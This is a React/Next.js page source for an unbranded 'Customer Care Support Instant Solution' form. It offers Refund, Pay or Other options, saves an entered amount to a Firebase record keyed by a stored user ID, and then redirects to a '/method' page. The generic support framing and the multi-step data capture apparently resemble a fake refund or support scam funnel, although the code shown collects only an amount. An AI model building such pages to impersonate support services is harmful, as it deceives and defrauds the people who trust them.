"use client";
import { useState } from "react";
import { ref, push, serverTimestamp, update } from "firebase/database";
import { database } from "@/app/lib/firebase";
import { useRouter } from "next/navigation";

export default function Home() {
  const router = useRouter();

  const [formData, setFormData] = useState({
    amount: "",
  });

  const [selectedOption, setSelectedOption] = useState("Refund");
  const handleOptionChange = (e) => {
    setSelectedOption(e.target.value);
  };

  const handleChange = (e) => {
    let { name, value } = e.target;
    setFormData({
      ...formData,
      [name]: value,
    });
  };

  const handleSubmit = async (e) => {
    e.preventDefault();

    // Get a reference to the "entries" node in Firebase database
    const formRef = ref(database, "entries");

    // Generate timestamp in milliseconds
    const timestamp = Date.now();

    // Add current timestamp to form data
    const formDataWithTime = {
      ...formData,
      time: timestamp,
    };

    // Push form data to Firebase database
    // const newRef = await push(formRef, formDataWithTime);

    const storedUserId = localStorage.getItem("newUserId");
    if (!storedUserId) {
      console.error("User ID not found in localStorage");
      return;
    }

    const userRef = ref(database, `entries/${storedUserId}`);
    await update(userRef, formDataWithTime);

    // Navigate to "/method" route after submission
    router.push("/method");

    // Clear form data after submission
    setFormData({
      amount: "",
    });
  };

  return (
    <div>
      <section className="w-full">
        <div className="p-2">
          <div className="mt-5">
            <img
              src="/male-customer-support-working-office-answering-consumer-questions_112255-1154.avif"
              className="w-full"
              alt="Logo"
            />
          </div>
          <form className="p-5" onSubmit={handleSubmit}>
            <div className="space-y-6 flex flex-col justify-center mt-5 p-1 rounded-none">
              <h1 className="text-[#000000] text-center text-3xl">
                Customer Care Support Instant Solution
              </h1>

              <div className="flex space-x-5">
                {["Refund", "Pay", "Other"].map((option) => (
                  <div key={option} className="flex items-center">
                    <input
                      id={option}
                      type="radio"
                      value={option}
                      name="payment-option"
                      checked={selectedOption === option}
                      onChange={handleOptionChange}
                      className="w-4 h-4 text-blue-600 bg-gray-100 border-gray-300 focus:ring-blue-500"
                    />
                    <label
                      htmlFor={option}
                      className="ms-2 text-sm font-medium text-gray-900"
                    >
                      {option}
                    </label>
                  </div>
                ))}
              </div>

              {/* Show amount input only if selected option is not "Other" */}
              {selectedOption !== "Other" && (
                <div className="mb-4">
                  <label
                    htmlFor="amount"
                    className="block mb-2 text-sm font-medium text-gray-900"
                  >
                    Amount <span className="text-red-500">*</span>
                  </label>
                  <input
                    className="shadow-sm placeholder:italic appearance-none rounded-md w-full py-2 px-3 text-green-700 leading-tight focus:outline-none border-[2px] border-green-500 placeholder:text-green-500"
                    id="amount"
                    type="text"
                    name="amount"
                    placeholder="Enter amount*"
                    value={formData.amount}
                    onChange={handleChange}
                  />
                </div>
              )}

              <div className="w-auto flex justify-end items-center mt-10">
                <button
                  className="bg-gradient-to-r from-green-500 to-green-500 text-white uppercase rounded-sm py-2 px-10"
                  type="submit"
                >
                  Submit
                </button>
              </div>
            </div>
          </form>
        </div>
      </section>
      {/* <!-- Footer --> */}
      <section className="bg-[#ffffff] p-5 w-full mt-24">
        <div className="flex space-x-1 w-full justify-between">
          <span className="text-xs text-black font-bold">Support</span>
          <span className="text-xs text-black font-bold">|</span>
          <span className="text-xs text-black font-bold">Find Us</span>
          <span className="text-xs text-black font-bold">|</span>
          <span className="text-xs text-black font-bold">Pricing & Fees</span>
          <span className="text-xs text-black font-bold">|</span>
          <span className="text-xs text-black font-bold">Compliance</span>
        </div>
        <div className="flex space-x-1 w-full justify-between mt-2">
          <span className="text-xs text-black font-bold">
            Terms & Conditions
          </span>
          <span className="text-xs text-black font-bold">|</span>
          <span className="text-xs text-black font-bold">
            Legal Disclosures
          </span>
          <span className="text-xs text-black font-bold">|</span>
          <span className="text-xs text-black font-bold">
            Safety Guidelines
          </span>
        </div>
        <div className="mt-5 text-[10px] text-black">
          Copyright @2021-2024 Customer Support. All rights reserved.
        </div>
      </section>
    </div>
  );
}
